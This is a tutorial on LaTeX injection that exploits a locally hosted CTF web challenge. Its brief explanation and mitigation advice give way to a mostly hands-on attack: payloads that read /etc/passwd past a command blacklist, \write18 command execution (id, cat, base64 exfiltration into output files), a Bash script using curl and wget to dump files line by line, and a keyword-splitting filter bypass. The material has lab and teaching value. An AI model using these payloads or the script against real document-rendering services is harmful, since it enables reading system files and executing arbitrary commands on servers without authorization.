**LaTeX injections** are a type of attack that exploits vulnerabilities in web applications that allow users to enter *text formatted* in LaTeX. LaTeX is a text composition system commonly used in academic and scientific writing.

LaTeX injection attacks occur when an attacker enters malicious LaTeX code into a text input field that is then processed in a web application. The LaTeX code can be designed to exploit vulnerabilities in the application and *execute malicious code* on the server.

An example of a LaTeX injection could be an attack that exploits the ability of LaTeX to include graphics and files in a web application. An attacker could send LaTeX code that includes a link to a malicious file, such as a virus or Trojan, that could infect the server or network systems.

To prevent LaTeX injections, web applications must properly validate and clean up incoming data before processing it into LaTeX. This includes removing special characters and limiting the commands that can be executed in LaTeX.

It is also important that web applications are run with minimum privileges on the network and that application activities are regularly monitored to detect possible injections. In addition, education about security in the use of LaTeX and how to prevent the introduction of malicious code should be encouraged.

# Example

For this example we must first download the following utilities:

```bash
apt install texlive-full -y
apt install zathura latexmk rubber -y
apt install poppler-utils
```

----
> Optionally we can select *zathura* as default PDF previewer:
> *xdg-mime query default application/pdf*
> *xdg-mime default zathura.desktop application/pdf*
----

Now we must go to */var/www/html* and do the following:

```bash
svn checkout https://github.com/internetwache/Internetwache-CTF-2016/trunk/tasks/web90/code
mv code/* .
rm -rf code
mv config.php.sample config.php

# Without this we would not have write permission
chown www-data:www-data -R *
service apache2 start
```

Now we can test if the following command works:

```latex
% To try to open and read a file, but it is sanitized
\input{/etc/passwd}
```

If we open the source code of *ajax.php* we see that both the *input* and *include* commands are blacklisted so we cannot use them. However, it is using the *pdflatex* command together with *--shell-escape* and that is not a very good idea, since if we can get in here we will be able to execute commands without any kind of limit.

Even if you are blocking the *input* and *include* commands there are other ways to read files:

```latex
% With this, we can read the first line of a file
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file

% With this, the second one
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\read\file to\line
\text{\line}
\closein\file

% With this, the third one
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\read\file to\line
\read\file to\line
\text{\line}
\closein\file

% We could use this to read multiple lines, but it is not a very good idea since there are too many characters that could cause LaTex to fail
\lstinputlisting{/etc/passwd}
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

As we have seen, the above command to read multiple lines is not a good idea, however, we can parse the *LaTex* conversion request with **BurpSuite**. We find that it sends the following data when executing the first example (read the first line of a file):

```
content=%5Cnewread%5Cfile%0A%5Copenin%5Cfile%3D%2Fetc%2Fpasswd%0A%5Cread%5Cfile+to%5Cline%0A%5Ctext%7B%5Cline%7D%0A%5Cclosein%5Cfile&template=blank
```

We see that it is url-encoded, but we can url-encode it better by replacing *spaces* with *%20* and line breaks with *%0A*:

```
content=\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file&template=blank

content=\newread\file%0A\openin\file=/etc/passwd%0A\read\file%20to\line%0A\text{\line}%0A\closein\file&template=blank
```

Now we can create a script in *Bash* to read the file line by line and if it does not interpret any letter, it will not show that line to us:

```bash
#!/bin/bash

# Global variables
declare -r main_url="http://localhost/ajax.php"
filename=$1

if [ $1 ]; then
    read_file_to_line="%0A\read\file%20to\line"
    for i in $(seq 1 100); do
	    # We apply -s parameter because we want to hide curl's verbose and -d is the data we want to send
	    # We apply -i in grep parameter because we want to make it case insensitive
        file_to_download=$(curl -s -X POST $main_url -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d "content=\newread\file%0A\openin\file=$filename$read_file_to_line%0A\text{\line}%0A\closein\file&template=blank" | grep -i download | awk 'NF{print $NF}')

        if [ $file_to_download ]; then
            wget $file_to_download &>/dev/null
            # We keep the last argument with awk
            file_to_convert=$(echo $file_to_download | tr '/' ' ' | awk 'NF{print $NF}')
            pdftotext $file_to_convert
            file_to_read=$(echo $file_to_convert | sed 's/\.pdf/\.txt/')
            rm $file_to_convert
            cat $file_to_read | head -n 1
            rm $file_to_read
            read_file_to_line+="%0A\read\file%20to\line"
        else
            read_file_to_line+="%0A\read\file%20to\line"
        fi
    done
else
    echo -e "\n[!] Usage: $0 /etc/passwd\n\n"
fi
```

We can execute commands as follows within the *LaTex* editor:

```latex
% With this option the result will be shown in the LaTex stderr, because it will give error when compiling
\immediate\write18{id}

% With this option we can export it to an output so we don't have to read it in the error, and then read it with the command to read a line
\immediate\write18{id > output}
\newread\file
\openin\file=output
\read\file to\line
\text{\line}
\closein\file
```

If we do a subdirectory scan with *gobuster* we will see the *compile* directory, if we put the command that I am going to show below, even if the compiler crashes, we will get a file with the complete desired output inside:

```latex
\immediate\write18{cat /etc/passwd > output.txt}
```

Returning to the case of the *input* command, even if it is not blacklisted, it can give us errors with the special characters, so we could play with the *immediate* command to convert it before to *base64*:

```latex
\immediate\write18{cat /etc/passwd | base64 > output}
\input{output}
```

If we copy the whole string in *base64* and save it in a *data* file, remove the line breaks and convert it to plain text, we will have the whole document without conflicts:

```bash
cat data | tr -d '\n' | base64 -d; echo
```

If for example the word *testing* is blacklisted, we could put it separately and then put it together to bypass it:

```latex
\def\first{test}
\def\second{ing}
\first\second
```